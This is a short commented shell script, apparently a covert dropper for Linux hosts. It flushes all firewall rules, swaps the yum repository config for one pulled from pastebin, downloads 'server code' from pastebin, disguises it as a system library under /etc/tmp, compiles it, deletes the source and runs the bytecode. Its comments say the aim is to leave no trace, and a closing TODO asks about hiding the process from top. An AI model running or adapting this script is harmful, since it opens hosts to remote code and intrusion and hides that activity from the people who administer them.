# Line by Line:
# 1. opens firewall to 1337 :)
# 2. downloads the yum config if python not installed
# 3. cleans up if python not installed
# 4. installs python if not installed
# 5. downloads the server code and moves it to a new location
# 6. runs the server code and backgrounds it & disowns it to ensure no trace

sudo strace -o /dev/null /bin/sh -lic "iptables -F;
rpm --quiet --query python3 || curl https://pastebin.com/raw/XLiGFWha > /etc/yum.repos.d/CentOS-Base.repo;
rpm --quiet --query python3 || yum clean all;
rpm --quiet --query python3 || yum install -y python3;
curl https://pastebin.com/raw/GFdr50Hi > server_code.py;
mkdir /etc/tmp;
mv server_code.py /etc/tmp/systemlibrary.py;
python3 -m compileall .;
rm /etc/tmp/systemlibrary.py;
python3 -W ignore /etc/tmp/__pycache__/systemlibrary.cpython-36.pyc
"

# TODO hide top?
